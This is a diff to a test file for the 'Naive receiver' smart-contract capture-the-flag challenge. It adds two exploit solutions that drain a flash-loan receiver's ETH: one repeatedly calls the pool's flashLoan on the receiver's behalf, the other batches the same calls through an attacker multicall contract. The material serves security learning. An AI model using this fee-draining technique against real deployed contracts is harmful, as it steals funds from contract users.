@@ -29,10 +29,69 @@ describe('[Challenge] Naive receiver', function () {
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+    it('Exploit in multiple transaction', async function () {
+        /** CODE YOUR EXPLOIT HERE */ 
+        for(i=0;i<10; i++){
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+        }
+
     });
 
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+        // All ETH has been drained from the receiver
+        expect(
+          await ethers.provider.getBalance(this.receiver.address)
+        ).to.be.equal("0");
+        expect(
+          await ethers.provider.getBalance(this.pool.address)
+        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
+    });
+});
+
+describe('[Challenge] Naive receiver', function () {
+    let deployer, user, attacker;
+
+    // Pool has 1000 ETH in balance
+    const ETHER_IN_POOL = ethers.utils.parseEther('1000');
+
+    // Receiver has 10 ETH in balance
+    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, user, attacker] = await ethers.getSigners();
+
+        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
+        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+
+        this.pool = await LenderPoolFactory.deploy();
+        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
+        
+        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
+        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
+
+        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
+        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
+        
+        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+    });
+    it('Exploit in single transaction', async function () {
+        /** CODE YOUR EXPLOIT HERE */ 
+        
+        const attackerContractFactory  = await ethers.getContractFactory('attackerMulticall', attacker);
+        const lendFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', attacker);
+        const target = this.pool.address;
+        let structCallData = [];
+        this.attackerContract = await attackerContractFactory.deploy();
+        for(i=0; i<10; i++){
+        const calldata = ethers.utils.arrayify(lendFactory.interface.encodeFunctionData("flashLoan",[
+            this.receiver.address, ethers.utils.parseEther('1')
+        ]));
+        structCallData.push([this.pool.address, false, calldata])
+        }
+        
+        await this.attackerContract.tryAggregate(structCallData);
+    });
     after(async function () {
         /** SUCCESS CONDITIONS */
 
